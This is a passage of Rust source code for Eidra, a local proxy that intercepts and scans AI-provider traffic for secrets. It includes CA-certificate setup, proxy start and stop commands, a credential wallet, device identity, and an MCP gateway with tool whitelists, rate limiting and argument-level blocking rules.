        "juliet", "kilo", "lima", "mike", "november", "oscar", "papa", "quebec", "romeo", "sierra",
        "tango", "uniform", "victor", "whiskey", "xray", "yankee", "zulu", "anchor", "bridge",
        "castle", "drift", "ember", "frost",
    ];

    let w1 = WORDS[hash[0] as usize % WORDS.len()];
    let w2 = WORDS[hash[1] as usize % WORDS.len()];
    let w3 = WORDS[hash[2] as usize % WORDS.len()];
    let w4 = WORDS[hash[3] as usize % WORDS.len()];

    format!("{}-{}-{}-{}", w1, w2, w3, w4)
}
```

### crates/eidra-core/src/commands/init.rs
```rust
use std::path::PathBuf;

use tracing::info;

/// Returns the Eidra home directory (~/.eidra/).
fn eidra_home() -> anyhow::Result<PathBuf> {
    let home = dirs_or_home()?;
    Ok(home.join(".eidra"))
}

fn dirs_or_home() -> anyhow::Result<PathBuf> {
    std::env::var("HOME")
        .map(PathBuf::from)
        .map_err(|_| anyhow::anyhow!("HOME environment variable not set"))
}

/// Initialize Eidra: generate a local CA certificate, create config directory,
/// copy default config and policy files, and detect Ollama.
pub async fn run() -> anyhow::Result<()> {
    let eidra_dir = eidra_home()?;

    // 1. Create ~/.eidra/ directory
    if eidra_dir.exists() {
        info!(path = %eidra_dir.display(), "Eidra directory already exists");
    } else {
        std::fs::create_dir_all(&eidra_dir)?;
        info!(path = %eidra_dir.display(), "Created Eidra directory");
    }

    // 2. Generate CA certificate with rcgen
    let ca_cert_path = eidra_dir.join("ca.pem");
    let ca_key_path = eidra_dir.join("ca-key.pem");

    if ca_cert_path.exists() && ca_key_path.exists() {
        info!("CA certificate already exists, skipping generation");
    } else {
        info!("Generating local CA certificate for HTTPS interception...");
        let (cert_pem, key_pem) = generate_ca_cert()?;
        std::fs::write(&ca_cert_path, &cert_pem)?;
        std::fs::write(&ca_key_path, &key_pem)?;

        // Set restrictive permissions on the private key
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&ca_key_path, std::fs::Permissions::from_mode(0o600))?;
        }

        info!("CA certificate written to {}", ca_cert_path.display());
        info!("CA private key written to {}", ca_key_path.display());
    }

    // 3. Copy default config.yaml
    let config_path = eidra_dir.join("config.yaml");
    if config_path.exists() {
        info!("config.yaml already exists, skipping");
    } else {
        let default_config = include_str!("../../../../config/default.yaml");
        std::fs::write(&config_path, default_config)?;
        info!("Default config written to {}", config_path.display());
    }

    // 4. Copy default policy.yaml
    let policy_path = eidra_dir.join("policy.yaml");
    if policy_path.exists() {
        info!("policy.yaml already exists, skipping");
    } else {
        let default_policy = include_str!("../../../../config/policies/default.yaml");
        std::fs::write(&policy_path, default_policy)?;
        info!("Default policy written to {}", policy_path.display());
    }

    // 5. Check for Ollama
    let ollama_available = check_ollama().await;

    // 6. Print setup instructions
    println!();
    println!("  eidra init complete!");
    println!();
    println!("  Created: {}", eidra_dir.display());
    println!("    - ca.pem        (CA certificate for HTTPS interception)");
    println!("    - ca-key.pem    (CA private key)");
    println!("    - config.yaml   (proxy & scan configuration)");
    println!("    - policy.yaml   (data handling policies)");
    println!();

    if ollama_available {
        println!("  Ollama detected at localhost:11434");
        println!("  Local LLM routing is available. Enable it in config.yaml:");
        println!("    local_llm:");
        println!("      enabled: true");
    } else {
        println!("  Ollama not detected at localhost:11434");
        println!("  To enable local LLM routing, install Ollama:");
        println!("    https://ollama.com/download");
    }

    println!();
    println!("  Next steps:");
    println!("    1. Trust the CA certificate:");
    println!("       macOS:  sudo security add-trusted-cert -d -r trustRoot \\");
    println!(
        "                 -k /Library/Keychains/System.keychain {}",
        ca_cert_path.display()
    );
    println!("       Linux:  sudo cp {} /usr/local/share/ca-certificates/eidra-ca.crt && sudo update-ca-certificates", ca_cert_path.display());
    println!();
    println!("    2. Start the proxy:");
    println!("       eidra start");
    println!();
    println!("    3. Configure your tools to use the proxy:");
    println!("       export HTTPS_PROXY=http://127.0.0.1:8080");
    println!();

    Ok(())
}

/// Generate a self-signed CA certificate using rcgen.
fn generate_ca_cert() -> anyhow::Result<(String, String)> {
    use rcgen::{CertificateParams, DistinguishedName, KeyPair};

    let mut params = CertificateParams::default();

    let mut dn = DistinguishedName::new();
    dn.push(rcgen::DnType::CommonName, "Eidra Local CA");
    dn.push(rcgen::DnType::OrganizationName, "Eidra");
    params.distinguished_name = dn;

    params.is_ca = rcgen::IsCa::Ca(rcgen::BasicConstraints::Unconstrained);
    params.key_usages = vec![
        rcgen::KeyUsagePurpose::KeyCertSign,
        rcgen::KeyUsagePurpose::CrlSign,
    ];

    // CA cert valid for 10 years
    let now = time::OffsetDateTime::now_utc();
    params.not_before = now;
    params.not_after = now + time::Duration::days(3650);

    let key_pair = KeyPair::generate()?;
    let cert = params.self_signed(&key_pair)?;

    let cert_pem = cert.pem();
    let key_pem = key_pair.serialize_pem();

    Ok((cert_pem, key_pem))
}

/// Check if Ollama is available at localhost:11434.
async fn check_ollama() -> bool {
    matches!(
        tokio::time::timeout(
            std::time::Duration::from_secs(2),
            tokio::net::TcpStream::connect("127.0.0.1:11434"),
        )
        .await,
        Ok(Ok(_))
    )
}
```

### crates/eidra-core/src/commands/join.rs
```rust
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

use eidra_transport::crypto::{derive_shared_secret, generate_keypair};

pub async fn run(room_id: &str, port: u16) -> anyhow::Result<()> {
    println!("Connecting to room {}...", room_id);

    let mut stream = TcpStream::connect(format!("127.0.0.1:{}", port)).await?;
    println!("Connected | Room: {} | E2EE: X25519+ChaCha20", room_id);

    // Key exchange: receive their public key first, then send ours
    let mut their_public_bytes = [0u8; 32];
    stream.read_exact(&mut their_public_bytes).await?;

    let keypair = generate_keypair();
    let our_public = keypair.public_key.as_bytes().to_owned();
    stream.write_all(&our_public).await?;

    let their_public = x25519_dalek::PublicKey::from(their_public_bytes);
    let shared_secret = derive_shared_secret(keypair.secret_key(), &their_public);

    super::escape::chat_loop_external(stream, shared_secret).await
}
```

### crates/eidra-core/src/commands/mod.rs
```rust
pub mod config;
pub mod dashboard;
pub mod escape;
pub mod init;
pub mod join;
pub mod scan;
pub mod start;
pub mod stop;
```

### crates/eidra-core/src/commands/scan.rs
```rust
use eidra_scan::scanner::Scanner;
use std::io::Read;

pub async fn run(path: Option<String>) -> anyhow::Result<()> {
    let scanner = Scanner::with_defaults();

    let input = match path {
        Some(ref p) => std::fs::read_to_string(p)?,
        None => {
            let mut buf = String::new();
            std::io::stdin().read_to_string(&mut buf)?;
            buf
        }
    };

    let findings = scanner.scan(&input);

    if findings.is_empty() {
        println!("✓ No findings.");
    } else {
        for f in &findings {
            println!(
                "[{}] {} ({}) at offset {}",
                f.severity, f.rule_name, f.category, f.offset
            );
        }
        println!("\n{} finding(s) total.", findings.len());
    }

    Ok(())
}
```

### crates/eidra-core/src/commands/start.rs
```rust
use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::Arc;

use eidra_audit::store::AuditStore;
use eidra_policy::engine::PolicyEngine;
use eidra_policy::loader::default_policy;
use eidra_proxy::create_event_channel;
use eidra_proxy::server::{run_proxy, ProxyConfig};
use eidra_proxy::tls::CaAuthority;
use eidra_scan::scanner::Scanner;

pub async fn run(listen: &str, dashboard: bool) -> anyhow::Result<()> {
    // Initialize scanner with default rules
    let scanner = Arc::new(Scanner::with_defaults());
    tracing::info!(
        "Scan engine loaded ({} classifiers)",
        scanner.classifier_count()
    );

    // Initialize policy engine
    let policy_config = default_policy();
    let policy = Arc::new(PolicyEngine::new(policy_config));
    tracing::info!("Policy engine loaded");

    // Initialize audit store
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
    let eidra_dir = std::path::PathBuf::from(&home).join(".eidra");
    std::fs::create_dir_all(&eidra_dir)?;
    let audit = Arc::new(AuditStore::open(&eidra_dir.join("audit.db"))?);
    tracing::info!("Audit store initialized at {}", eidra_dir.display());

    // Load CA for HTTPS MITM (optional — degrades to HTTP-only mode if absent)
    let ca_cert_path = eidra_dir.join("ca.pem");
    let ca_key_path = eidra_dir.join("ca-key.pem");
    let ca = if ca_cert_path.exists() && ca_key_path.exists() {
        match CaAuthority::load(&ca_cert_path, &ca_key_path) {
            Ok(ca) => {
                tracing::info!(
                    "CA loaded from {} — HTTPS MITM enabled for AI providers",
                    eidra_dir.display()
                );
                Some(Arc::new(ca))
            }
            Err(e) => {
                tracing::warn!(
                    "Failed to load CA from {}: {} — continuing in HTTP-only mode",
                    eidra_dir.display(),
                    e
                );
                None
            }
        }
    } else {
        tracing::warn!(
            "CA files not found at {} — HTTPS MITM disabled. \
             Run `eidra init` to generate CA certificates, then trust the CA in your OS.",
            eidra_dir.display()
        );
        None
    };

    // Create event channel for TUI
    let (event_tx, event_rx) = create_event_channel();

    // Start proxy
    let addr: SocketAddr = listen
        .parse()
        .map_err(|e| anyhow::anyhow!("invalid listen address: {}", e))?;
    let config = ProxyConfig {
        listen_addr: addr,
        metadata: HashMap::new(),
    };

    // Write PID file for `eidra stop`
    let pid_file = eidra_dir.join("proxy.pid");
    std::fs::write(&pid_file, std::process::id().to_string())?;

    if dashboard {
        // Run proxy in background, TUI in foreground
        tracing::info!("Starting Eidra proxy on {} with dashboard", addr);
        let proxy_handle = tokio::spawn(async move {
            if let Err(e) = run_proxy(config, scanner, policy, audit, event_tx, ca).await {
                tracing::error!("Proxy error: {}", e);
            }
        });

        // Run TUI (this blocks until user quits)
        super::dashboard::run_tui(event_rx).await?;

        proxy_handle.abort();
    } else {
        tracing::info!("Starting Eidra proxy on {}", addr);
        run_proxy(config, scanner, policy, audit, event_tx, ca)
            .await
            .map_err(|e| anyhow::anyhow!("{}", e))?;
    }

    Ok(())
}
```

### crates/eidra-core/src/commands/stop.rs
```rust
use std::path::PathBuf;

pub async fn run() -> anyhow::Result<()> {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
    let pid_file = PathBuf::from(&home).join(".eidra").join("proxy.pid");

    if !pid_file.exists() {
        println!("Eidra proxy is not running (no pid file found).");
        return Ok(());
    }

    let pid_str = std::fs::read_to_string(&pid_file)?;
    let pid: i32 = pid_str
        .trim()
        .parse()
        .map_err(|e| anyhow::anyhow!("invalid pid file: {}", e))?;

    // Send SIGTERM
    let result = unsafe { libc::kill(pid, libc::SIGTERM) };

    if result == 0 {
        std::fs::remove_file(&pid_file)?;
        println!("Eidra proxy (PID {}) stopped.", pid);
    } else {
        let err = std::io::Error::last_os_error();
        if err.raw_os_error() == Some(libc::ESRCH) {
            // Process doesn't exist, clean up stale pid file
            std::fs::remove_file(&pid_file)?;
            println!("Eidra proxy was not running (stale pid file cleaned up).");
        } else {
            anyhow::bail!("failed to stop proxy (PID {}): {}", pid, err);
        }
    }

    Ok(())
}
```

### crates/eidra-core/src/main.rs
```rust
mod commands;

use clap::{Parser, Subcommand};

#[derive(Parser)]
#[command(
    name = "eidra",
    about = "Edge-native trust for humans, agents, and machines.",
    version
)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Initialize Eidra (generate CA, create config)
    Init,
    /// Start the intercept proxy
    Start {
        /// Listen address
        #[arg(short, long, default_value = "127.0.0.1:8080")]
        listen: String,
        /// Launch with TUI dashboard
        #[arg(short, long)]
        dashboard: bool,
    },
    /// Stop the proxy
    Stop,
    /// Scan a file or stdin for secrets
    Scan {
        /// File path to scan (reads stdin if omitted)
        path: Option<String>,
    },
    /// Open the TUI dashboard (starts proxy + dashboard)
    Dashboard {
        /// Listen address for proxy
        #[arg(short, long, default_value = "127.0.0.1:8080")]
        listen: String,
    },
    /// Open a zero-trace encrypted room
    Escape,
    /// Join a zero-trace encrypted room
    Join {
        /// Room ID
        room_id: String,
        /// Port to connect to
        port: u16,
    },
    /// Manage configuration
    Config {
        /// Action: show, path, edit, edit-policy, reset
        action: Option<String>,
    },
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();

    // Only init tracing for non-TUI commands (TUI takes over the terminal)
    let is_tui = matches!(
        cli.command,
        Commands::Dashboard { .. }
            | Commands::Start {
                dashboard: true,
                ..
            }
    );
    if !is_tui {
        tracing_subscriber::fmt()
            .with_env_filter(
                tracing_subscriber::EnvFilter::try_from_default_env()
                    .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info")),
            )
            .init();
    }

    match cli.command {
        Commands::Start { listen, dashboard } => commands::start::run(&listen, dashboard).await?,
        Commands::Dashboard { listen } => commands::start::run(&listen, true).await?,
        Commands::Scan { path } => commands::scan::run(path).await?,
        Commands::Init => commands::init::run().await?,
        Commands::Stop => commands::stop::run().await?,
        Commands::Escape => commands::escape::run().await?,
        Commands::Join { room_id, port } => commands::join::run(&room_id, port).await?,
        Commands::Config { action } => commands::config::run(action).await?,
    }

    Ok(())
}
```

### crates/eidra-identity/src/credential.rs
```rust
use std::collections::HashMap;

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

/// The type of credential.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum CredentialType {
    /// Attestation that a request comes from a registered Eidra device.
    DeviceAttestation,
    /// Role credential for an AI agent (e.g., "EXECUTOR", "SENTINEL").
    AgentRole,
    /// Custom credential type.
    Custom(String),
}

/// A verifiable credential stored in the local credential wallet.
///
/// In v1, this is a simple structured record. In v2, this will conform
/// to W3C Verifiable Credentials 2.0 with cryptographic proofs.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Credential {
    /// Unique credential identifier.
    pub id: String,
    /// The type of this credential.
    pub credential_type: CredentialType,
    /// Who issued this credential.
    pub issuer: String,
    /// Who this credential is about.
    pub subject: String,
    /// When the credential was issued.
    pub issued_at: DateTime<Utc>,
    /// When the credential expires (None = never).
    pub expires_at: Option<DateTime<Utc>>,
    /// Claims contained in this credential.
    pub claims: HashMap<String, String>,
    /// Extensible metadata.
    pub metadata: HashMap<String, String>,
}

impl Credential {
    /// Create a new credential.
    pub fn new(
        credential_type: CredentialType,
        issuer: impl Into<String>,
        subject: impl Into<String>,
    ) -> Self {
        Self {
            id: Uuid::new_v4().to_string(),
            credential_type,
            issuer: issuer.into(),
            subject: subject.into(),
            issued_at: Utc::now(),
            expires_at: None,
            claims: HashMap::new(),
            metadata: HashMap::new(),
        }
    }
}

/// A local wallet for storing credentials.
///
/// In v1, this is in-memory only. In v2, credentials will be persisted
/// in an encrypted SQLite database.
#[derive(Debug, Default)]
pub struct CredentialWallet {
    credentials: Vec<Credential>,
}

impl CredentialWallet {
    /// Create a new empty credential wallet.
    pub fn new() -> Self {
        Self::default()
    }

    /// Add a credential to the wallet.
    pub fn add_credential(&mut self, credential: Credential) {
        self.credentials.push(credential);
    }

    /// Find all credentials matching the given type.
    pub fn find_by_type(&self, credential_type: &CredentialType) -> Vec<&Credential> {
        self.credentials
            .iter()
            .filter(|c| &c.credential_type == credential_type)
            .collect()
    }

    /// Get the total number of credentials in the wallet.
    pub fn len(&self) -> usize {
        self.credentials.len()
    }

    /// Check if the wallet is empty.
    pub fn is_empty(&self) -> bool {
        self.credentials.is_empty()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn wallet_add_and_find() {
        let mut wallet = CredentialWallet::new();
        assert!(wallet.is_empty());

        let cred1 = Credential::new(
            CredentialType::DeviceAttestation,
            "eidra-local",
            "device-abc",
        );
        let cred2 = Credential::new(CredentialType::AgentRole, "eidra-local", "agent-executor");
        let cred3 = Credential::new(
            CredentialType::DeviceAttestation,
            "eidra-local",
            "device-xyz",
        );

        wallet.add_credential(cred1);
        wallet.add_credential(cred2);
        wallet.add_credential(cred3);

        assert_eq!(wallet.len(), 3);

        let attestations = wallet.find_by_type(&CredentialType::DeviceAttestation);
        assert_eq!(attestations.len(), 2);

        let roles = wallet.find_by_type(&CredentialType::AgentRole);
        assert_eq!(roles.len(), 1);

        let custom = wallet.find_by_type(&CredentialType::Custom("unknown".into()));
        assert!(custom.is_empty());
    }
}
```

### crates/eidra-identity/src/error.rs
```rust
use thiserror::Error;

/// Errors that can occur in the identity layer.
#[derive(Debug, Error)]
pub enum IdentityError {
    /// Key generation failed.
    #[error("key generation error: {0}")]
    KeyGeneration(String),

    /// Storage operation failed.
    #[error("storage error: {0}")]
    Storage(String),

    /// Verification failed.
    #[error("verification error: {0}")]
    Verification(String),

    /// Identity not found.
    #[error("identity not found")]
    NotFound,

    /// Custom error.
    #[error("{0}")]
    Custom(String),
}

pub type Result<T> = std::result::Result<T, IdentityError>;
```

### crates/eidra-identity/src/identity.rs
```rust
use std::collections::HashMap;

use chrono::{DateTime, Utc};
use rand::RngCore;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::error::{IdentityError, Result};

/// A device-bound identity. In v1, this uses a software key pair.
/// Future versions will use hardware secure elements (Secure Enclave, TPM).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeviceIdentity {
    /// SHA-256 hash of the public key, used as the device identifier.
    pub device_id: String,
    /// The public key bytes.
    pub public_key: Vec<u8>,
    /// When this identity was created.
    pub created_at: DateTime<Utc>,
    /// Extensible metadata.
    pub metadata: HashMap<String, String>,
}

impl DeviceIdentity {
    /// Generate a new device identity with a random 32-byte key pair.
    ///
    /// In v1 this is a software key pair. The device_id is the SHA-256 hash
    /// of the public key, providing a stable identifier without exposing the key.
    pub fn generate() -> Result<Self> {
        let mut rng = rand::thread_rng();

        // Generate a random 32-byte "secret key"
        let mut secret_key = [0u8; 32];
        rng.try_fill_bytes(&mut secret_key)
            .map_err(|e| IdentityError::KeyGeneration(format!("RNG failed: {e}")))?;

        // Derive "public key" by hashing the secret key (v1 simplification;
        // in v2 this would be a proper asymmetric derivation via Secure Enclave)
        let public_key = {
            let mut hasher = Sha256::new();
            hasher.update(b"eidra-v1-pubkey-derive:");
            hasher.update(secret_key);
            hasher.finalize().to_vec()
        };

        // device_id = SHA-256 of public key (hex encoded)
        let device_id = Self::compute_device_id(&public_key);

        Ok(Self {
            device_id,
            public_key,
            created_at: Utc::now(),
            metadata: HashMap::new(),
        })
    }

    /// Generate a device identity from a known public key.
    /// Useful for reconstructing identity from stored keys.
    pub fn from_public_key(public_key: Vec<u8>) -> Self {
        let device_id = Self::compute_device_id(&public_key);
        Self {
            device_id,
            public_key,
            created_at: Utc::now(),
            metadata: HashMap::new(),
        }
    }

    /// Get the device ID hash.
    pub fn device_id_hash(&self) -> &str {
        &self.device_id
    }

    /// Compute the device ID from a public key (SHA-256 hex).
    fn compute_device_id(public_key: &[u8]) -> String {
        let mut hasher = Sha256::new();
        hasher.update(public_key);
        let hash = hasher.finalize();
        hex::encode(hash)
    }
}

/// Simple hex encoding (no external dep needed).
mod hex {
    pub fn encode(bytes: impl AsRef<[u8]>) -> String {
        bytes.as_ref().iter().map(|b| format!("{b:02x}")).collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn generate_produces_valid_identity() {
        let identity = DeviceIdentity::generate().expect("should generate identity");
        assert!(!identity.device_id.is_empty());
        assert_eq!(identity.public_key.len(), 32);
        // device_id is SHA-256 hex = 64 chars
        assert_eq!(identity.device_id.len(), 64);
    }

    #[test]
    fn device_id_is_deterministic_from_same_key() {
        let public_key = vec![1u8; 32];
        let id1 = DeviceIdentity::from_public_key(public_key.clone());
        let id2 = DeviceIdentity::from_public_key(public_key);

        assert_eq!(id1.device_id, id2.device_id);
        assert_eq!(id1.device_id_hash(), id2.device_id_hash());
    }

    #[test]
    fn different_keys_produce_different_ids() {
        let id1 = DeviceIdentity::from_public_key(vec![1u8; 32]);
        let id2 = DeviceIdentity::from_public_key(vec![2u8; 32]);
        assert_ne!(id1.device_id, id2.device_id);
    }
}
```

### crates/eidra-identity/src/lib.rs
```rust
pub mod credential;
pub mod error;
pub mod identity;
```

### crates/eidra-mcp/src/config.rs
```rust
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Configuration for the MCP (Model Context Protocol) gateway.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpGatewayConfig {
    /// Whether the MCP gateway is enabled.
    #[serde(default)]
    pub enabled: bool,

    /// Address to listen on (e.g., "127.0.0.1:8081").
    #[serde(default = "default_listen")]
    pub listen: String,

    /// Whitelist of allowed MCP servers. Key is the server name/id.
    #[serde(default)]
    pub server_whitelist: HashMap<String, McpServerEntry>,

    /// Global rate limit (requests per minute). 0 means unlimited.
    #[serde(default)]
    pub global_rate_limit: u32,

    /// Extensible metadata.
    #[serde(default)]
    pub metadata: HashMap<String, String>,
}

/// A semantic argument-level access control rule for an MCP tool.
///
/// Instead of just allowing/blocking tools by name, this inspects the
/// arguments of tool calls and blocks based on semantic patterns (e.g.,
/// destructive SQL, sensitive file paths, dangerous shell commands).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpToolRule {
    /// Tool name this rule applies to (e.g., "execute_sql", "read_file", "run_command").
    /// Use "*" to match all tools on this server.
    pub tool: String,

    /// Regex patterns to block in serialized tool arguments.
    #[serde(default)]
    pub block_patterns: Vec<String>,

    /// Allowed path patterns (for file access tools). Paths matching these
    /// are permitted even if they match a `blocked_paths` pattern.
    #[serde(default)]
    pub allowed_paths: Vec<String>,

    /// Blocked path patterns (for file access tools).
    #[serde(default)]
    pub blocked_paths: Vec<String>,

    /// Human-readable description of this rule.
    #[serde(default)]
    pub description: String,
}

/// An entry in the MCP server whitelist.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpServerEntry {
    /// Human-readable name of the MCP server.
    pub name: String,

    /// The endpoint URL of the MCP server.
    pub endpoint: String,

    /// Whether this server is enabled.
    #[serde(default = "default_true")]
    pub enabled: bool,

    /// Allowed tools for this server. Empty means all tools allowed.
    #[serde(default)]
    pub allowed_tools: Vec<String>,

    /// Blocked tools for this server. Takes precedence over allowed_tools.
    #[serde(default)]
    pub blocked_tools: Vec<String>,

    /// Per-server rate limit (requests per minute). 0 means use global.
    #[serde(default)]
    pub rate_limit: u32,

    /// Whether to scan responses from this server.
    #[serde(default = "default_true")]
    pub scan_responses: bool,

    /// Semantic argument-level access control rules for tools on this server.
    #[serde(default)]
    pub tool_rules: Vec<McpToolRule>,

    /// Extensible metadata.
    #[serde(default)]
    pub metadata: HashMap<String, String>,
}

impl Default for McpGatewayConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            listen: default_listen(),
            server_whitelist: HashMap::new(),
            global_rate_limit: 0,
            metadata: HashMap::new(),
        }
    }
}

fn default_listen() -> String {
    "127.0.0.1:8081".to_string()
}

fn default_true() -> bool {
    true
}
```

### crates/eidra-mcp/src/error.rs
```rust
use thiserror::Error;

/// Errors that can occur in the MCP gateway.
#[derive(Debug, Error)]
pub enum McpError {
    /// The requested MCP server is not in the whitelist.
    #[error("MCP server '{server}' is not in the whitelist")]
    ServerNotWhitelisted { server: String },

    /// The requested tool is not allowed on this MCP server.
    #[error("Tool '{tool}' is not allowed on MCP server '{server}'")]
    ToolNotAllowed { server: String, tool: String },

    /// The requested tool is explicitly blocked on this MCP server.
    #[error("Tool '{tool}' is blocked on MCP server '{server}'")]
    ToolBlocked { server: String, tool: String },

    /// Rate limit exceeded.
    #[error("Rate limit exceeded for MCP server '{server}': {limit} requests/min")]
    RateLimitExceeded { server: String, limit: u32 },

    /// The MCP server is disabled in configuration.
    #[error("MCP server '{server}' is disabled")]
    ServerDisabled { server: String },

    /// The MCP gateway itself is disabled.
    #[error("MCP gateway is disabled")]
    GatewayDisabled,

    /// Configuration error.
    #[error("MCP configuration error: {0}")]
    ConfigError(String),

    /// Scan found sensitive data in MCP response.
    #[error("Sensitive data found in MCP response from '{server}': {details}")]
    SensitiveDataInResponse { server: String, details: String },

    /// Semantic policy violation — tool arguments matched a blocked pattern.
    #[error(
        "semantic policy violation: tool '{tool}' blocked — {rule} (pattern: {matched_pattern})"
    )]
    SemanticPolicyViolation {
        tool: String,
        rule: String,
        matched_pattern: String,
    },

    /// Generic I/O or network error.
    #[error("MCP I/O error: {0}")]
    Io(#[from] std::io::Error),

    /// Transport/upstream forwarding error.
    #[error("MCP transport error: {0}")]
    Transport(String),

    /// Serialization/deserialization error.
    #[error("MCP serialization error: {0}")]
    Serialization(String),

    /// Custom error for extensibility.
    #[error("MCP error: {0}")]
    Custom(String),
}
```

### crates/eidra-mcp/src/gateway.rs
```rust
use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::{Arc, Mutex};
use std::time::Instant;

use http_body_util::{BodyExt, Full};
use hyper::body::{Bytes, Incoming};
use hyper::server::conn::http1;
use hyper::service::service_fn;
use hyper::{Request, Response, StatusCode};
use hyper_util::rt::TokioIo;
use tokio::net::TcpListener;
use tracing::{error, info, warn};

use eidra_scan::scanner::Scanner;

use crate::config::McpGatewayConfig;
use crate::error::McpError;
use crate::handler::{self, McpRequest, McpResponse};

/// Per-server rate limiting state.
struct RateLimitState {
    /// Number of requests in the current window.
    count: u32,
    /// Start of the current window.
    window_start: Instant,
}

/// MCP Gateway server that proxies and validates JSON-RPC requests.
pub struct McpGateway {
    config: McpGatewayConfig,
    scanner: Arc<Scanner>,
    /// Per-server rate limit counters. Key is server name.
    rate_limits: Arc<Mutex<HashMap<String, RateLimitState>>>,
}

impl McpGateway {
    /// Create a new MCP Gateway with the given configuration and scanner.
    pub fn new(config: McpGatewayConfig, scanner: Arc<Scanner>) -> Self {
        Self {
            config,
            scanner,
            rate_limits: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    /// Run the MCP gateway, listening on the given address.
    ///
    /// This is the main server loop. It accepts HTTP connections and
    /// processes JSON-RPC requests according to the gateway configuration.
    pub async fn run(&self, listen_addr: SocketAddr) -> Result<(), McpError> {
        if !self.config.enabled {
            return Err(McpError::GatewayDisabled);
        }

        let listener = TcpListener::bind(listen_addr).await?;
        info!("MCP Gateway listening on {}", listen_addr);

        let config = Arc::new(self.config.clone());
        let scanner = self.scanner.clone();
        let rate_limits = self.rate_limits.clone();

        loop {
            let (stream, peer_addr) = listener.accept().await?;
            let io = TokioIo::new(stream);
            let config = config.clone();
            let scanner = scanner.clone();
            let rate_limits = rate_limits.clone();

            tokio::spawn(async move {
                let svc = service_fn(move |req| {
                    let config = config.clone();
                    let scanner = scanner.clone();
                    let rate_limits = rate_limits.clone();
                    async move { handle_request(req, &config, &scanner, &rate_limits).await }
                });

                if let Err(err) = http1::Builder::new().serve_connection(io, svc).await {
                    error!("Error serving connection from {}: {}", peer_addr, err);
                }
            });
        }
    }
}

/// Check per-server rate limit. Returns Ok(()) if within limit.
fn check_rate_limit(
    rate_limits: &Mutex<HashMap<String, RateLimitState>>,
    server_name: &str,
    limit: u32,
) -> Result<(), McpError> {
    if limit == 0 {
        return Ok(());
    }

    let mut limits = rate_limits
        .lock()
        .map_err(|e| McpError::Custom(format!("Rate limit lock poisoned: {}", e)))?;

    let now = Instant::now();
    let state = limits
        .entry(server_name.to_string())
        .or_insert(RateLimitState {
            count: 0,
            window_start: now,
        });

    // Reset window every 60 seconds
    if now.duration_since(state.window_start).as_secs() >= 60 {
        state.count = 0;
        state.window_start = now;
    }

    if state.count >= limit {
        return Err(McpError::RateLimitExceeded {
            server: server_name.to_string(),
            limit,
        });
    }

    state.count += 1;
    Ok(())
}

/// Handle a single HTTP request to the MCP gateway.
async fn handle_request(
    req: Request<Incoming>,
    config: &McpGatewayConfig,
    scanner: &Scanner,
    rate_limits: &Mutex<HashMap<String, RateLimitState>>,
) -> Result<Response<Full<Bytes>>, hyper::Error> {
    // Only accept POST for JSON-RPC
    if req.method() != hyper::Method::POST {
        let resp = McpResponse::error(None, -32600, "Only POST method accepted".to_string());
        return Ok(json_response(StatusCode::METHOD_NOT_ALLOWED, &resp));
    }

    // Read body
    let body_bytes = match req.collect().await {
        Ok(collected) => collected.to_bytes(),
        Err(e) => {
            error!("Failed to read request body: {}", e);
            let resp = McpResponse::error(None, -32700, "Failed to read request body".to_string());
            return Ok(json_response(StatusCode::BAD_REQUEST, &resp));
        }
    };

    let body_str = String::from_utf8_lossy(&body_bytes);

    // Parse JSON-RPC request
    let mcp_req: McpRequest = match serde_json::from_str(&body_str) {
        Ok(r) => r,
        Err(e) => {
            warn!("Invalid JSON-RPC request: {}", e);
            let resp = McpResponse::error(None, -32700, format!("Parse error: {}", e));
            return Ok(json_response(StatusCode::BAD_REQUEST, &resp));
        }
    };

    // Validate against config (whitelist, ACL)
    if let Err(err) = handler::validate_request(config, &mcp_req) {
        warn!("MCP request blocked: {}", err);
        let resp = McpResponse::error(mcp_req.id.clone(), -32001, err.to_string());
        return Ok(json_response(StatusCode::FORBIDDEN, &resp));
    }

    // Semantic RBAC: validate tool arguments against semantic rules
    if mcp_req.method == "tools/call" {
        if let Some(ref params) = mcp_req.params {
            if let (Some(server_name), Some(tool_name)) = (
                params.get("server_name").and_then(|v| v.as_str()),
                params.get("name").and_then(|v| v.as_str()),
            ) {
                let arguments = params
                    .get("arguments")
                    .cloned()
                    .unwrap_or(serde_json::Value::Object(serde_json::Map::new()));
                if let Err(err) =
                    handler::validate_tool_arguments(config, server_name, tool_name, &arguments)
                {
                    warn!("MCP request blocked by semantic policy: {}", err);
                    let resp = McpResponse::error(mcp_req.id.clone(), -32001, err.to_string());
                    return Ok(json_response(StatusCode::FORBIDDEN, &resp));
                }
            }
        }
    }

    // Rate limiting for tool calls
    if mcp_req.method == "tools/call" {
        if let Some(ref params) = mcp_req.params {
            if let Some(server_name) = params.get("server_name").and_then(|v| v.as_str()) {
                // Determine rate limit for this server
                let limit = config
                    .server_whitelist
                    .get(server_name)
                    .map(|s| {
                        if s.rate_limit > 0 {
                            s.rate_limit
                        } else {
                            config.global_rate_limit
                        }
                    })
                    .unwrap_or(config.global_rate_limit);

                if let Err(err) = check_rate_limit(rate_limits, server_name, limit) {
